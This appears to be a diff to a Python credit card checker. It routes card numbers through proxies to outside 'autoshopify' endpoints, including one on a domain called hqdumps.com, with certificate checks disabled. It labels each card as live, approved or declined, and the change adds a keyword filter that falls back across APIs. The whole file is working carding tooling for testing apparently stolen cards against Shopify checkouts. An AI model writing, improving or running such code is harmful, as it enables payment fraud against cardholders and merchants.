@@ -3,15 +3,14 @@ import traceback
 import urllib3
 import random
 import logging
+import json
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logger = logging.getLogger(__name__)
 
-# List of API endpoints – add as many as you want
 SHOPIFY_APIS = [
     "https://kamalxd.tech/sh/index.php",
     "https://hqdumps.com/autoshopify/index.php",
-    # Add more here if available
 ]
 
 def format_proxy(proxy):
@@ -32,6 +31,22 @@ def format_proxy(proxy):
     except Exception:
         return None
 
+def is_valid_response(data):
+    """Check if the response indicates a real card result."""
+    if not isinstance(data, dict) or 'Response' not in data:
+        return False
+    resp = data['Response'].lower()
+    # Real card responses contain these words
+    good_keywords = ['declined', 'approved', 'insufficient', 'cvv', 'do not honor', 'expired', 'success', 'live', 'completed']
+    # API‑error responses contain these
+    bad_keywords = ['timeout', 'error', 'unavailable', 'dead']
+    if any(k in resp for k in bad_keywords):
+        return False
+    if any(k in resp for k in good_keywords):
+        return True
+    # If it's something else, treat as invalid to force fallback
+    return False
+
 def check_site_shopify_direct(site_url, cc, proxy=None):
     params = {'cc': cc, 'url': site_url}
     if proxy:
@@ -47,17 +62,17 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
 
     for idx, api_url in enumerate(SHOPIFY_APIS):
         try:
-            logger.info(f"Trying API {idx+1}: {api_url}")
+            logger.info(f"API {idx+1}: {api_url}")
             response = requests.get(
                 api_url,
                 params=params,
                 headers=headers,
                 proxies=proxies,
-                timeout=20,          # slightly longer to avoid premature timeout
+                timeout=25,
                 verify=False
             )
             data = response.json()
-            if isinstance(data, dict) and 'Response' in data:
+            if is_valid_response(data):
                 resp_text = data.get('Response', 'Unknown')
                 price = data.get('Price', '0.00')
                 gateway = data.get('Gate', 'Unknown')
@@ -76,7 +91,7 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
                 elif 'do not honor' in resp_lower:
                     status = 'DECLINED'
 
-                logger.info(f"API {idx+1} returned: {resp_text} (status: {status})")
+                logger.info(f"API {idx+1} returned: {resp_text}")
                 return {
                     'Response': resp_text,
                     'status': status,
@@ -85,14 +100,8 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
                     'site': site
                 }
             else:
-                logger.warning(f"API {idx+1} returned invalid JSON structure: {data}")
+                logger.warning(f"API {idx+1} returned invalid data: {data}")
                 continue  # try next API
-        except requests.exceptions.Timeout:
-            logger.error(f"API {idx+1} timeout")
-            continue
-        except requests.exceptions.ProxyError as e:
-            logger.error(f"API {idx+1} proxy error: {e}")
-            continue
         except Exception as e:
             logger.error(f"API {idx+1} failed: {e}")
             continue
